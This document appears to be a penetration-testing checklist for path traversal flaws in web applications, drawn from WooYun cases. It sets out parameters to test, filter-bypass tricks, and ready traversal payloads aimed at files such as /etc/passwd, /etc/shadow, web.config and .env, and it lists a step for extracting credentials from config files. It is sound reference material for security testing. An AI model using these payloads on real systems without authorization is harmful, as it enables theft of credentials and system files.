# Path Traversal Testing Checklist
> Derived from ~30 real-world vulnerability cases (WooYun 2010-2016)

## High-Risk Parameters to Test
| Parameter | Frequency | Context |
|-----------|-----------|---------|
| `filePath` / `filepath` | High | File download/read endpoints |
| `filename` | High | Download handlers |
| `url` / `urlParam` | Medium | Proxy/fetch endpoints |
| `RelatedPath` | Medium | File management panels |
| `dd` | Medium | Document download links |
| `image` | Low | Image proxy/thumbnail |
| `path`, `name`, `n` | Low | Generic file parameters |
| `FileID`, `FileName` | Low | Attachment download |
| `Accessory` | Low | CMS attachment handlers |
| `hDFile` | Low | Download handlers |
| `tpl` | Low | Template inclusion |
| `bg` | Low | Background/theme loaders |

## Common Attack Patterns
1. **Direct file read** via download endpoints (most common)
2. **Directory listing** through misconfigured web servers
3. **CMS-specific file read** (phpCMS, SiteServer, Yxcms, FineCMS)
4. **Backup file exposure** via predictable paths
5. **Configuration file leak** (database.php, web.xml, web.config)
6. **Null byte injection** to bypass extension checks

## Bypass Techniques
- `../` replaced with empty string? Use `....//` or `..././`
- Extension check? Use null byte: `../../etc/passwd%00.jpg`
- Absolute path blocked? Try relative traversal
- Forward slash filtered? Try backslash on Windows: `..\..\..\`
- URL encoding: `%2e%2e%2f` or double-encode `%252e%252e%252f`
- Browser vs curl: Some traversals only work via raw HTTP (not browser)

## Quick Test Vectors
```
# Basic traversal
../../../etc/passwd
..\..\..\..\windows\win.ini

# Null byte bypass
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# Double-encoding
%252e%252e%252f%252e%252e%252fetc/passwd

# Filter bypass (double dots replaced)
....//....//....//etc/passwd
..././..././..././etc/passwd

# Java/Tomcat paths
/WEB-INF/web.xml
/WEB-INF/classes/
/META-INF/MANIFEST.MF

# Windows targets
..\..\..\..\windows\system32\drivers\etc\hosts
```

## High-Value Target Files
| Platform | Files |
|----------|-------|
| Linux | `/etc/passwd`, `/etc/shadow` |
| Windows | `win.ini`, `boot.ini` |
| PHP | `config.php`, `database.php`, `.env` |
| Java | `WEB-INF/web.xml`, `WEB-INF/classes/` |
| .NET | `web.config`, `machine.config` |
| General | `.svn/entries`, `.git/config`, `.bash_history` |

## Testing Methodology
1. Identify all file download/read endpoints
2. Map parameters that accept file paths or names
3. Test basic `../` traversal sequences (3-8 levels deep)
4. Attempt null byte injection for extension bypasses
5. Try encoding variations if basic traversal is filtered
6. Target configuration files for credential extraction
7. Check if directory listing is enabled on web roots
8. Test both GET and POST parameter variants

## Common Root Causes
- `file_get_contents($_GET['path'])` without sanitization
- Download handlers that pass user input directly to filesystem
- Incomplete filtering (replacing `../` once instead of recursively)
- Extension validation via client-side or bypassable checks
- CMS file managers exposing parent directory navigation
